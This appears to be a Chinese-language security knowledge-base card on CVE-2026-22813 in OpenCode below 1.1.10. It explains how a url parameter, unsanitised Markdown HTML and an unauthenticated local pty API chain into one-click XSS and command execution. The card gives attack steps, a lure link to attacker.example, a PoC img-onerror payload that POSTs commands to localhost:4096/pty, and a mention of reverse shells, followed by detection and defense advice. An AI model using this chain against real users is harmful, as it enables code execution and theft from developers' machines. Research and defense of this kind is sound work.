---
id: web-nodejs-opencode-ai-url-param-xss-local-pty-rce
title: OpenCode <1.1.10 url 参数加载会话 → Markdown HTML XSS → 本地 pty API 任意命令执行（CVE-2026-22813）
type: scenario
domain: web
path: web/nodejs
technique: opencode-url-param-xss-local-pty-rce
aliases:
- CVE-2026-22813
- OpenCode XSS to RCE
- OpenCode url 参数 XSS
- localhost 4096 pty RCE
- marked html true XSS
- OpenCode 本地 API 命令执行
tags:
- web
- nodejs
- bun
- xss
- rce
- opencode
- cve-2026-22813
- local-api
- pty
- markdown
cve:
- CVE-2026-22813
severity: critical
confidence: high
status: verified
affected_versions: < 1.1.10
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V172
  verified_at: '2026-11-06T11:56:02+08:00'
  notes: 已对照原文与7张图核对：url 参数直接 return param、marked 默认 html:true 且未接 DOMPurify、index.html 无 CSP、Pty.create 直接 spawn(command,args,{cwd,env})、1.1.10 release notes 删除内嵌JS/自定义url并默认禁用server；受影响版本 <1.1.10 与原文一致。未验证点：原文为代码审计，未给出端到端 XSS→RCE 执行截图；卡片 PoC 的 POST /pty 路由未在原文源码中展示，需按实际版本路由确认；PoC 未复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

OpenCode `< 1.1.10` 在终端启动时自动开放 `localhost:4096` 的网页 UI 与全部 API；前端读取 `url` 参数后无校验地加载另一个站点的会话数据，`marked` 以默认 `html: true` 渲染且未接 DOMPurify，页面也没有 CSP，远程会话里的 HTML/JS 会在 `localhost:4096` 源下执行；XSS 随后同源调用未鉴权的本地 `pty` 创建接口，把前端传入的 `command/args/cwd/env` 直接交给 `bun-pty` 启动进程，形成一键 XSS→RCE 链（CVSS 9.4）。

## 原理

- **本地 HTTP 服务自动暴露**：OpenCode 是终端 AI 编程助手；受影响版本运行 `opencode` 时会在后台自动启动本地 HTTP 服务器（`localhost:4096`），网页 UI 与所有 API 同时可用，且没有额外鉴权。浏览器中的任意页面/脚本都可能访问 `localhost` 上的这个服务（只要能触发请求），本地服务因此成为高价值攻击面。
- **url 参数跨源加载会话**：前端 `defaultServerUrl` 读取 `document.location.search` 的 `url` 参数，`ServerProvider` 以该 URL 作为 server，加载“另一个 OpenCode 会话的数据”。代码没有校验目标 URL 的源、协议或内容，功能本意是会话共享，实际让攻击者可以把任意远程数据注入本机 UI。
- **Markdown HTML XSS**：UI 使用 `marked` 渲染会话内容，`marked.use()` 只加了 KaTeX/Shiki 与自定义链接渲染，没有修改默认 `html: true`，也没有引入 DOMPurify；`index.html` 没有 CSP。因此远程会话数据里的 `<script>`、事件属性或危险 HTML 会被原样插入 DOM 并执行，且可加载任意外部资源。
- **同源调用本地 pty API**：XSS 在 `localhost:4096` 源下运行，可直接 `fetch` 本地 API。`Pty.create` 的 `CreateInput` 接受 `command`、`args`、`cwd`、`title`、`env`，`create()` 直接 `spawn(command, args, {cwd, env})`，没有命令白名单、路径校验或权限检查；攻击者因此可以让本地服务以运行 OpenCode 的用户权限执行任意命令。
- **链式成立的关键**：三个信任边界叠加——前端信任 `url` 参数、Markdown 渲染器信任远程 HTML、本地 pty API 信任前端输入。单独看任一环节可能只是“功能设计”，组合后本地服务从助手变成任意命令执行入口；XSS 由受害者浏览器在 localhost 源执行，绕过了“本地服务只监听 127.0.0.1”的网络隔离假设。
- **修复**：官方在 1.1.10 删除内嵌 JavaScript 与自定义 `url` 参数，并默认禁用本地 HTTP 服务器；说明根因正是“本地服务 + 远程会话加载 + HTML 渲染 + 无鉴权 pty”的组合。

## 触发条件

- 目标运行 OpenCode `< 1.1.10`，且已启动 `opencode`（自动拉起 `localhost:4096` 的 UI/API）。
- 受害者会点击攻击者构造的链接，使浏览器访问 `http://localhost:4096/?url=<攻击者会话数据地址>`（或通过其他方式让 UI 加载远程会话）。
- 攻击者能托管会话数据（JSON/Markdown/HTML），其中包含可执行 HTML/JS。
- 本地 UI 使用 `marked` 默认 `html: true` 且无 DOMPurify/CSP；本地 pty API 未鉴权、可从浏览器同源访问。
- 运行 OpenCode 的用户权限决定 RCE 权限（通常为开发者本人，可能持有代码、云凭证、SSH 密钥）。

## 利用步骤

1. 在攻击者服务器准备一份 OpenCode 会话数据（按 UI 期望的会话/消息结构），在消息内容中放入 HTML/JS，例如 `<img src=x onerror="...">` 或 `<script>...</script>`；也可利用 Markdown 的原始 HTML。
2. 构造链接 `http://localhost:4096/?url=https://attacker.example/session`，通过邮件/IM/网页诱导受害者点击；链接可伪装成“OpenCode 会话共享/协作邀请”。
3. 受害者浏览器打开 UI，前端从 `url` 拉取攻击者数据并交给 `marked` 渲染，HTML 在 `localhost:4096` 源执行。
4. JS 同源调用本地 pty 创建接口，提交 `command`/`args`/`cwd`/`env`；例如 Linux 启动 `/bin/sh -c 'id > /tmp/pwned'`，Windows 启动 `cmd.exe /c calc.exe`。
5. 如需交互式 shell，可继续连接该 pty 会话的 WebSocket（`Pty.connect`/`write`）发送命令并读取输出；也可直接执行反弹 shell 或下载后续载荷。
6. 验证命令执行结果，完成从“点链接”到“本地代码执行”的链。

## PoC

按原文代码路径构造的最小 XSS→pty 调用示意（未在目标环境执行；HTTP 路由以实际版本源码为准，原文核心为 `Pty.create` 的 `CreateInput`）：

```html
<!-- 攻击者会话数据中的消息内容 -->
<img src=x onerror="
fetch('http://localhost:4096/pty', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    command: 'cmd.exe',
    args: ['/c', 'calc.exe'],
    cwd: 'C:\\\\',
    title: 'pwn'
  })
});
">
```

Linux 版本把 `command/args` 换成：

```json
{"command":"/bin/sh","args":["-c","id > /tmp/opencode_pwned"],"cwd":"/tmp"}
```

原文的漏洞链代码证据：
- 前端 `defaultServerUrl` 直接 `return param`（`url` 参数无校验）。
- `marked.use()` 未设置 `html: false`，未引入 DOMPurify；`index.html` 无 CSP。
- `Pty.create(input)` 中 `const command = input.command || Shell.preferred()`、`spawn(command, args, {cwd, env})`，无任何校验。

## 变体与关联

- 变体：`url` 参数指向攻击者控制的“会话共享”页面；Markdown 原始 HTML、链接 `javascript:`/事件属性、KaTeX/Shiki 渲染链中的注入；本地 pty 换成文件写入、命令执行、模型调用等其他未鉴权 API。
- 同类目标：其他在终端启动后自动开放 localhost Web UI/API 的 AI 编程助手、本地 Agent 工具、IDE 插件；凡是“本地服务 + 浏览器渲染远程内容 + 无鉴权 API”的组合都值得检查。
- 关联：[[web-nodejs-opencode-ai-worktree-startcommand-bash-rce]]（同组件另一条命令注入 RCE）、[[web-nodejs-opencode-ai-file-find-raw-shell-injection]]（同组件 Bun Shell 注入）、[[web-generic-xss-admin-blind-stored-registration]]（XSS 基础）、[[ai-security-agent-security-llm-tool-call-indirect-injection-ssrf]]（本地 Agent API 滥用）。

## 检测与防御

- **升级/关闭**：升级到 OpenCode ≥ 1.1.10；不需要网页 UI 时禁用本地 HTTP 服务器；不要把 `localhost:4096` 暴露到局域网/公网。
- **输入校验**：`url` 参数只允许同源或白名单源，禁止任意远程地址；对会话数据做 schema 校验，不要直接信任远程 JSON/HTML。
- **渲染安全**：`marked` 设置 `html: false` 或接入 DOMPurify 白名单净化；配置 CSP（`default-src 'self'`、禁止 `unsafe-inline`、限制 `img-src`/`connect-src`）；禁用内联事件属性。
- **本地 API 鉴权**：为 pty/文件/命令类 API 增加随机 token、Origin/CSRF 校验、命令白名单与用户确认；不要仅依赖“只监听 127.0.0.1”。
- **检测**：监控浏览器对 `localhost:4096/?url=` 的访问、UI 加载远程会话、页面内对 `/pty` 的 POST、异常子进程（cmd.exe/sh/calc/反弹 shell）；检查 OpenCode 版本与本地服务监听状态。
- **用户侧**：不要点击来源不明的“OpenCode 会话共享”链接；开发者工具/本地服务运行时避免访问可疑网页；发现异常终端/进程立即断网排查。
